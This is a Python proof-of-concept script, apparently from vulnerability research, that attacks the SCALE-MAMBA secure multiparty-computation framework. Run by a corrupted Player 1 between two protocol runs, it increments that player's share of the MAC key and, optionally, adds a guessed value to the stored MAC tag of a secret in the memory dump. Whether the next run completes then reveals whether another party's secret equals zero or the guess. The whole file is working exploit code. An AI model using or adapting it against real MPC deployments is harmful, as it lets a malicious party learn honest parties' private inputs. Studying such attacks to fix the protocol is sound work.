#!/usr/bin/env python3
"""
Between-runs patcher for the SCALE-MAMBA cross-run MAC-key-inconsistency PoC.

Runs as the corrupted Player 1 on its own filesystem, between the
`attack_store` (run 1) and `attack_open` (run 2) invocations. It edits two
files Player 1 owns:

  Data/MKey-1.key  - increment Player 1's additive share of the MAC key alpha
                     by 1  (so the global key becomes alpha + 1)
  Data/Memory-P1   - [full input-guessing only] add Mont(g) to Player 1's
                     share of the MAC tag of the secret stored at Ms[ADDR]

Memory dump layout (SCALE-MAMBA Machine::Dump_Memory writes `Mc << Mr << Ms`,
each Memory<T> as the ASCII header "1048576\n" followed by 2^20 entries):

    Mc : Memory<gfp>      2^20 * 16 bytes   (128-bit prime -> 2 limbs)
    Mr : Memory<Integer>  2^20 *  8 bytes   (long)
    Ms : Memory<Share>    2^20 * 33 bytes   (1 player byte + 16 value + 16 mac)

gfp values are written in Montgomery form (raw mp_limb_t bytes, little-endian).
Addition is linear under Montgomery form, so adding Mont(g) = g*R mod p
(R = 2^128) to the stored MAC limbs adds g to the represented MAC value mod p.

Modes:
  --mkey-only      version A (zero-check): change the key only. Run 2 then
                   completes iff the reused secret y == 0.
  --guess G        version B (input-guessing): also add g to y's MAC tag.
                   Run 2 then completes iff y == g.
"""
from __future__ import annotations
import argparse, sys
from pathlib import Path

_QUIET = False


def log(msg: str) -> None:
    if not _QUIET:
        print(msg)


PSZ = 1 << 20
HDR = len("1048576\n")            # 8
GFP_BYTES = 16                    # 128-bit prime -> 2 * 8-byte limbs
INT_BYTES = 8
SHARE_BYTES = 1 + GFP_BYTES + GFP_BYTES   # 33

MC_OFF, MC_DATA = 0, HDR
MR_OFF  = MC_DATA + PSZ * GFP_BYTES
MR_DATA = MR_OFF + HDR
MS_OFF  = MR_DATA + PSZ * INT_BYTES
MS_DATA = MS_OFF + HDR


def read_prime(sharing_data_txt: Path) -> int:
    with sharing_data_txt.open() as f:
        return int(f.readline().strip())


def mac_share_offset(addr: int) -> int:
    if not (0 <= addr < PSZ):
        raise ValueError(f"addr {addr} out of range")
    return MS_DATA + SHARE_BYTES * addr + 1 + GFP_BYTES


def patch_mac_key(mkey_path: Path, p: int) -> None:
    parts = mkey_path.read_text().split()
    old = int(parts[0]) % p
    new = (old + 1) % p
    # keep any extra macs (multi-mac configs) untouched
    rest = (" " + " ".join(parts[1:])) if len(parts) > 1 else ""
    mkey_path.write_text(f"{new}{rest} \n")
    log("[patcher] MKey-1: alpha_1 -> alpha_1 + 1  (global key alpha -> alpha + 1)")


def patch_memory_mac(memory_p1: Path, addr: int, g: int, p: int) -> None:
    R = 1 << (8 * GFP_BYTES)
    delta = (g % p) * R % p
    data = bytearray(memory_p1.read_bytes())
    expected = MS_DATA + PSZ * SHARE_BYTES
    if len(data) != expected:
        sys.exit(f"[patcher] unexpected Memory-P1 size {len(data)}, expected {expected}")
    for off, name in [(MC_OFF, "Mc"), (MR_OFF, "Mr"), (MS_OFF, "Ms")]:
        if bytes(data[off:off + HDR]) != b"1048576\n":
            sys.exit(f"[patcher] missing {name} header at {off}: {bytes(data[off:off+HDR])!r}")
    off = mac_share_offset(addr)
    mac_int = int.from_bytes(data[off:off + GFP_BYTES], "little")
    if mac_int >= p:
        sys.exit(f"[patcher] MAC share at addr {addr} >= p; format mismatch?")
    new_mac = (mac_int + delta) % p
    data[off:off + GFP_BYTES] = new_mac.to_bytes(GFP_BYTES, "little")
    memory_p1.write_bytes(data)
    log(f"[patcher] Memory-P1: Ms[{addr}].mac += {g}  (value share untouched)")


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--data-dir", default="Data")
    ap.add_argument("--addr", type=int, default=100)
    grp = ap.add_mutually_exclusive_group(required=True)
    grp.add_argument("--guess", type=int, help="version B: complete iff y == guess")
    grp.add_argument("--mkey-only", action="store_true", help="version A: complete iff y == 0")
    ap.add_argument("--quiet", action="store_true", help="suppress per-edit log lines")
    args = ap.parse_args()

    global _QUIET
    _QUIET = args.quiet

    d = Path(args.data_dir)
    p = read_prime(d / "SharingData.txt")
    patch_mac_key(d / "MKey-1.key", p)
    if args.guess is not None:
        patch_memory_mac(d / "Memory-P1", args.addr, args.guess, p)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
